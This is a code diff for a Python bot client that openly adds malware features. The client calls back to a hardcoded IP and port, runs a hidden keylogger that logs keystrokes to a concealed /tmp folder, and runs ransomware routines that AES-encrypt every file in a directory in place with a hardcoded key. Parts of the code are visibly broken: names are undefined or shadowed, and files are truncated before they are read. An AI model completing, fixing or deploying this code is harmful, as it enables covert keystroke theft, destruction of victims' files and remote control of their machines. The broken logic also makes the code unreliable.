@@ -10,10 +10,12 @@ MODULE NAME: ______
 try:
 	import socket # Import socket for creating TCP connection.
 	from subprocess import PIPE, run # Import subprocess to execute system commands.
-	from os import devnull, remove, mkdir # Import devnull, mkdir, and remove from os module.
+	from os import devnull, remove, mkdir, path # Import devnull, mkdir, and remove from os module.
 	from sys import exit # Import exit from sys to quit program when specified.
 	from platform import system # Import system from platform to detect os.
 	from pynput import keyboard # Import keyboard to perform keylogger operations.
+	from threading import Timer # Import Timer to create thread that'll run every 20s.
+	from Crypto.Cipher import AES # Use AES encryption to encrypt stuff.
 except ImportError:
     exit(1)
     
@@ -23,6 +25,9 @@ FILENAME = __file__[2:]
 IP = "172.17.0.1" # IP address to connect to.
 PORT = 1337 # Port number to create socket with.
 DIRECTORY = "/tmp/.folder" # Hidden folder to create for our keylogger.
+KEY = "Where's the money?" # Encryption key... :)
+
+global log
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -36,11 +41,10 @@ def create_client_socket(ip_addr: str, port: int):
 			This function will return a socket object.
 	"""
 	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_sock: # Initializing socket.
-		conn = (IP, PORT) # Connect to server IP/Port.
-		client_ip = socket.gethostbyname(host) # Get local IP using host name.
-		initial_message = "IP=" + client_ip + ",OS=" + system() # Send IP address and OS information.
+		ip_port = (IP, PORT) # Connect to server IP/Port.
+		client_sock.connect(ip_port)
+		initial_message = "OS=" + system() # Send IP address and OS information.
 		client_sock.send(initial_message.encode()) # Send message with this host's IP back to the server.
-		
 		return client_sock # Return the created client socket.
 		
 def self_delete(name: str):
@@ -72,9 +76,32 @@ def auto_recon():
 
 	"""
 
-def on_press():
+""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
+
+# Keylogger stuff-=-=-=-=-=-=-=-=-=-=-=-=-=-
+def on_press(key):
 	"""
 	"""
+	try:
+		self.log += str(key.char)
+	except AttributeError:
+		if key == key.space:
+			self.log += ' '
+		elif key == key.enter: self.log += '\n'
+		elif key == key.backspace: self.log += ''
+		elif key == key.ctrl: self.log += ' ctrl+'
+		elif key == key.tab: self.log += '\t'
+		else:
+			self.log += str(key)
+
+def log_to_file():
+	"""
+	"""
+	global log
+	f = open(DIRECTORY + 'log.txt', 'a+')
+	f.write(log)
+	cycle = Timer(30, log_to_file)
+	cycle.start()
 
 def keylogger():
 	"""This function will start a keylogger in the background and will save its
@@ -82,13 +109,54 @@ def keylogger():
 		Arguments:
 		Returns:
 	"""
-	with keyboard.Listener(onpress=on_press) as capturer:
-		mkdir()
-def ransomware():
+	with keyboard.Listener(
+		onpress=on_press) as capturer:
+		try:
+			mkdir(DIRECTORY) # Attempt to create hidden directory in temp folder.
+			capturer.join()
+		except OSError:
+			pass
+
+""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
+
+# Ransomware stuff-=-=-=-=-=-=-=-=-=-=-=-=-=
+def encrypt_it(data: str):
+	"""This function will encyrpt the data passed as an argument.
+		Arguments:
+			data (str): The contents of a file.
+		Returns:
+			Will return the encrypted form of the files contents.
+	"""
+	AES_obj = AES.new(KEY, AES.MODE_CBC, "You have been pawned.")
+	return AES_obj.encrypt(data)
+
+def decrypt_it(data: str):
+	"""This function will decyrpt the data passed as an argument.
+		Arguments:
+			data (str): The contents of a file.
+		Returns:
+			Will return the decrypted form of the files contents.
+	"""
+	AES_obj = AES.new(KEY, data, AES.MODE_CBC, "You have been pawned.")
+	return AES_obj.decrypt(data)
+
+def ransomware(*request: str):
 	"""This function will encrypt a folder, a file, or the entire volume on a computer.
 		Arguments:
 		Returns
 	"""
+	action, path = request
+	for f in listdir(path):
+		abs_path = path.join(f, path)
+		with open(abs_path, 'r') as input_file:
+			to_write = None
+			with open(abs_path, 'w') as output_file:
+				file_contents = input_file.read()
+				if action == 'encrypt':
+					to_write = encrypt_it(file_contents)
+				else:
+					to_write = decrypt_it(file_contents)
+				output_file.write(to_write)
 
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
@@ -170,8 +238,6 @@ def main():
 		obj = LinuxBot() # If Linux, instantiate LinuxBot object.
 	else:
 		obj = WindowsBot() # Else, instantiate WindowsBot object.
-
-	
 
 if __name__ == '__main__':
     main()
